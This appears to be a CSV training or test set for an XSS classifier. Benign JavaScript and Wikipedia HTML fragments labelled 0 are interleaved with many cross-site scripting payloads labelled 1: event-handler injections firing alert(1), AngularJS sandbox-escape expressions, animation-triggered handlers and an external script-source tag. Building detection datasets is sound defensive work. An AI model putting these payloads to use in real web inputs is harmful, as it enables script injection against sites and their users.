payload,label
<script onpointerup=alert(1)>xss</script>,1
"document.body.removeeventlistener('click', this._handletriggerclick); } this.$overlay[0].removeeventlistener('click', this._handleoverlayclickbound);",0
"i = 0, length; if (isstring(selector)) {",0
"}, { key: ""_comparedates"", value: function _comparedates(a, b) {",0
this.el.m_chips = undefined; } _setupeventhandlers() {,0
this.counterel = document.createelement('span'),0
$('.github-commit') .find('.date') .html(date);,0
"<nav oncontextmenu=""alert(1)"">test</nav>",1
$('.collapsible.expandable').collapsible({ accordion: false });,0
"</span><a href=""/w/index.php?title=artificial_intelligence&amp;action=edit&amp;section=13"" title=""edit section: general intelligence"">edit </a><span class=""mw-editsection-bracket"">]",0
"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",1
"</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=artsy&amp;rft.atitle=it%27s+getting+hard+to+tell+if+a+painting+was+made+by+a+computer+or+a+human&amp;rft.date=2017-09-21&amp;rft.aulast=chun&amp;rft.aufirst=rene&amp;rft_id=https%3a%2f%2fwww.artsy.net%2farticle%2fartsy-editorial-hard-painting-made-computer-human&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
var altside = mainaxis === 'y' ? bottom : right,0
"} _removeeventhandlers() { this.el.removeeventlistener('click', this._handletargetclickbound);",0
"{{a='constructor';b={};a.sub.call.call(b[a].getownpropertydescriptor(b[a].getprototypeof(a.sub),a).value,0,'alert(1)')()}}",1
"left: this.options.dialradius + math.sin(radian) * radius - this.options.tickradius + 'px', top: this.options.dialradius - math.cos(radian) * radius - this.options.tickradius + 'px' });",0
"<optgroup onkeyup=""alert(1)"" contenteditable>test</optgroup>",1
"<pre onmousedown=""alert(1)"">test</pre>",1
"<article onkeyup=""alert(1)"" contenteditable>test</article>",1
"<dir oncut=""alert(1)"" contenteditable>test</dir>",1
"<li id=""cite_note-56""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-56"">^ </a> </b>",0
"<div onmouseleave=""alert(1)"">test</div>",1
"<slot onmousemove=""alert(1)"">test</slot>",1
var _min = _offset + overflow[_mainside],0
} if (this._eventispointerpentouch(event)) { this._deltax = event.clientx;,0
"<button onclick=""alert(1)"">test</button>",1
"matches: matches, unique: unique, isarray: array.isarray,",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></xmp>",1
"})(cash); ;(function ($, anim) { 'use strict';",0
"<main onclick=""alert(1)"">test</main>",1
"<rtc onmouseout=""alert(1)"">test</rtc>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></b>",1
if (theme === 'auto') {,0
"_setattributeifnotexists(element, attribute, value) { if (!element.hasattribute(attribute)) { element.setattribute(attribute, value);",0
value: function _handletabclick(e) {,0
"<script src=""http://.rocks/.jpg""></script>",1
? this.$el.find('.carousel-item.active').first() : this.$el.find('.carousel-item').first(); let firstimage = firstslide.find('img').first();,0
} var source = content.nodetype ? content[0].outerhtml : content; return this.each(function (v) {,0
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,1
"<script>window.name='javascript:alert(1)';function blah(){} blah(""""+new class b{tostring=e=>location=name}+"""")</script>",1
"each(this, callback); return this; },",0
const isvisible = element => { if (!iselement(element) || element.getclientrects().length === 0) { return false;,0
} _enter() { if (this._isshown() || this._ishovered) {,0
$('.dynamic-color .col').each(function() { $(this) .children(),0
var value = ((this.el.value || this.options.defaulttime || '') + '').split(':'),0
let selector = element.getattribute('data-bs-target'),0
"<li><a href=""/wiki/propositional_attitude"" title=""propositional attitude"">propositional attitude </a> </li>",0
"}, siblings: function (selector) { var collection = this.parent().children(selector),",0
"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",1
"container: '(string|element|boolean)', customclass: '(string|function)', delay: '(number|object)',",0
if (this.options.data.length) {,0
<var id=x tabindex=1 onfocusin=alert(1)></var>,1
if (0 === k) return 0,0
<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>,1
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",1
<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>,1
"<style>@keyframes x{}</style><param style=""animation-name:x"" onanimationend=""alert(1)""></param>",1
var _selectindex2 = currchips._selectedchip.index() + 1,0
"anim({ targets: this.$photocaption[0], opacity: 1,",0
this._timeout = 0; this._ishovered = null; this._activetrigger = {};,0
"return this.find(focusables, element).filter(el => !index_js.isdisabled(el) && index_js.isvisible(el)); }, getselectorfromelement(element) {",0
return unsafehtml; } if (sanitizefunction && typeof sanitizefunction === 'function') {,0
<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>,1
backdrop.classlist.add(class_name_fade$4); } this._element = backdrop;,0
} const elementisvisible = getcomputedstyle(element).getpropertyvalue('visibility') === 'visible' const closeddetails = element.closest('details:not([open])'),0
"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>",1
if (!target) { return; },0
"targets: this.$photocaption[0], opacity: 0, duration: this.options.outduration,",0
g.play = function () {,0
"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>",1
toast._draggedtoast = null; m.toast = toast; m.toast = function (options) {,0
"tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;[""a"",""alert(1)""].sort(tostring.constructor)",1
if (selector && window.css && window.css.escape) {,0
let $trigger = $(e.target),0
`<span>${beforematch}<span class='highlight'>${matchtext}</span>${aftermatch}</span>`,0
"<div class=""magnify""><a href=""/wiki/file:x-ray_of_a_hand_with_automatic_bone_age_calculation.jpg"" class=""internal"" title=""enlarge""> </a> </div><a href=""/wiki/projectional_radiography"" title=""projectional radiography"">x-ray </a> of a hand, with automatic calculation of <a href=""/wiki/bone_age"" title=""bone age"">bone age </a> by computer software </div> </div> </div>",0
<content id=x tabindex=1 onfocus=alert(1)></content>,1
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",1
"key: ""init"", value: function init(els, options) { return _get(charactercounter.__proto__ || object.getprototypeof(charactercounter), ""init"", this).call(this, this, els, options);",0
"<figure draggable=""true"" ondragenter=""alert(1)"">test</figure>",1
"<bdi onmouseup=""alert(1)"">test</bdi>",1
"<mark oncontextmenu=""alert(1)"">test</mark>",1
"var mainclippingparents = boundary === 'clippingparents' ? getclippingparents(element) : [].concat(boundary); var clippingparents = [].concat(mainclippingparents, [rootboundary]); var firstclippingparent = clippingparents[0];",0
document.body.style.overflow = 'hidden'; } this.el.classlist.add('open');,0
this._innavbar = this._detectnavbar(); } static get default() {,0
"}; class modal extends basecomponent { constructor(element, config) {",0
"<aside onbeforepaste=""alert(1)"" contenteditable>test</aside>",1
"object.keys(scope_events).foreach(function( bind ){ var tevent = bind.split('.')[0], tnamespace = bind.substring(tevent.length);",0
} return orientation ? (rect.top + pageoffset.y - docelem.clienttop) : (rect.left + pageoffset.x - docelem.clientleft); },0
var currindex = $(e.target).index(); this.set(currindex); },0
const event_focusin = `focusin${event_key}`; const event_keydown_tab = `keydown.tab${event_key}`; const tab_key = 'tab';,0
toast.innerhtml = this.message; } toast._container.appendchild(toast);,0
_maybeenablecycle() { if (!this._config.ride) { return;,0
"unit = math.pi / (ishours ? 6 : 30), radian = value * unit, radius =",0
"let _defaults = { alignment: 'left', autofocus: true,",0
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>,1
"eventhandler.on(document, event_keydown_tab, event => this._handlekeydown(event)) this._isactive = true }",0
"}); })), function (a) { return !h.und(a);",0
"{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; c=c.$apply(c);b=c(b,c,b);$evalasync(""astnode=pop();astnode.type='unaryexpression';astnode.operator='alert(1)';astnode.argument={type:'identifier'};"");m1=$$asyncqueue.pop().expression;m2=b(c,null,m1);[].push.apply=m2;$eval('b(b)');}}",1
"strategy = _options$strategy === void 0 ? state.strategy : _options$strategy, _options$boundary = _options.boundary, boundary = _options$boundary === void 0 ? clippingparents : _options$boundary,",0
"return hash.replace(/(:|\.|\[|\]|,|=|\/)/g, '\\$1'); }; m.elementorparentisfixed = function (element) {",0
} setinputvalue() { this.el.value = this.tostring();,0
let $cardreveal = $(this).find('.card-reveal'),0
"<rp onbeforepaste=""alert(1)"" contenteditable>test</rp>",1
"if ($(e.target).is('input, textarea') || !chipskeydown) {",0
var tethermax = offset + maxoffset - offsetmodifiervalue,0
const selector_menu = '.dropdown-menu' const selector_navbar = '.navbar' const selector_navbar_nav = '.navbar-nav',0
"<nobr onmouseup=""alert(1)"">test</nobr>",1
"<dl draggable=""true"" ondragenter=""alert(1)"">test</dl>",1
<dir id=x tabindex=1 onbeforedeactivate=alert(1)></dir><input autofocus>,1
"<section onmousedown=""alert(1)"">test</section>",1
isstring = function (item) {,0
"first: function () { return this.eq(0); },",0
"} else cancelanimationframe(b), b = 0",0
"<em oncontextmenu=""alert(1)"">test</em>",1
index_js.execute(this._config.clickcallback),0
"<table onkeydown=""alert(1)"" contenteditable>test</table>",1
} } if (!this.nowrap || this.center >= 0 && this.center < this.count) {,0
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",1
if (opts.showdaysinnextandpreviousmonths) {,0
} function topct ( pct ) { return pct + '%';,0
return } this.pause(),0
"<nav onmouseup=""alert(1)"">test</nav>",1
this.close(); } _handlemonthchange(e) {,0
"<sub onclick=""alert(1)"">test</sub>",1
"<div class=""thumbinner"" style=""width:222px;"">",0
"<h1 onmouseleave=""alert(1)"">test</h1>",1
"</span> <span class=""reference-text""><cite class=""citation journal"">ontanon, santiago; synnaeve, gabriel; uriarte, alberto; richoux, florian; churchill, david; preuss, mike (december 2013). ""a survey of real-time strategy game ai research and competition in starcraft"". <i>ieee transactions on computational intelligence and ai in games </i>. <b>5 </b> (4): 293–311. <a href=""/wiki/citeseerx"" title=""citeseerx"">citeseerx </a>&#160;<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.406.2524"">10.1.1.406.2524 </a>",0
} }]); return taptarget;,0
if (focused.next().length) { focused.removeclass('focused'); focused.next().addclass('focused');,0
"var parent = el.parentnode,",0
"var scrollspy = function (_component9) { _inherits(scrollspy, _component9); function scrollspy(el, options) {",0
"v.setattribute(name, value)",0
datepicker._settostartofday(this.date),0
"<bdi oncut=""alert(1)"" contenteditable>test</bdi>",1
"<mark onkeyup=""alert(1)"" contenteditable>test</mark>",1
if (!visited.has(dep)) {,0
value: function _setupvariables() { this.currentview = 'hours'; this.vibrate = navigator.vibrate ? 'vibrate' : navigator.webkitvibrate ? 'webkitvibrate' : null;,0
} function getwindowscroll(node) { var win = getwindow(node);,0
for (var pluginname in registry) {,0
</span></a></dt><dd>post-process and store your scraped data.</dd>,0
"<section draggable=""true"" ondrag=""alert(1)"">test</section>",1
this._handleopenbound = this.open.bind(this),0
group.unshift(firstinrange); ignorefirst = true; },0
if (this._config.toggle) { this.toggle() },0
"<sub onkeyup=""alert(1)"" contenteditable>test</sub>",1
"m.range = range; if (m.jqueryloaded) { m.initializejquerywrapper(range, 'range', 'm_range');",0
"<article onmousemove=""alert(1)"">test</article>",1
"function (el, selector) { return el === selector; });",0
<progress onpointerenter=alert(1)>xss</progress>,1
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",1
let taptargetwaveleft = taptargetwidth / 2 - taptargetwavewidth / 2; let taptargetwrappercssobj = {}; taptargetwrappercssobj.top = istop ? taptargettop + 'px' : '';,0
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",1
"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",1
"<h3 id=""p-cactions-label"">",0
"if (typeof offset === 'function') { return popperdata => offset(popperdata, this._element) }",0
<* onpointermove=alert(1) style=display:block>xss</*>,1
} } const getselector = element => {,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></map>",1
"handleentrypoint(ordered[index][1], ordered[index][0], this)",0
"<option onmouseleave=""alert(1)"">test</option>",1
"js: { files: ['js *', '!js/init.js'], tasks: ['js_compile'],",0
<param onpointermove=alert(1)>xss</param>,1
body: 'scrollspy is a jquery plugin that tracks certain elements and which element the users screen is currently centered on.' }); window.index.add({,0
document.createevent('touchevent'),0
const complete = () => {,0
"<li id=""cite_note-391""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-391"">^ </a> </b>",0
var taptargetleft = originleft + originwidth / 2 - taptargetwidth / 2,0
"key: ""_setupfixed"", value: function _setupfixed() { if (this._iscurrentlyfixed()) {",0
this.$selectoptions.each((el) => { if ($(el).is('option')) { let optionel;,0
_this25.$activetablink.addclass('active'),0
let taptargetwavetop = taptargetheight / 2 - taptargetwaveheight / 2,0
"}; })(cash, m.anime); ;(function ($, anim) {",0
"return this; }, insertbefore: function (selector) {",0
"<h1 onkeydown=""alert(1)"" contenteditable>test</h1>",1
<multicol id=x tabindex=1 onactivate=alert(1)></multicol>,1
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationstart=""alert(1)""></dialog>",1
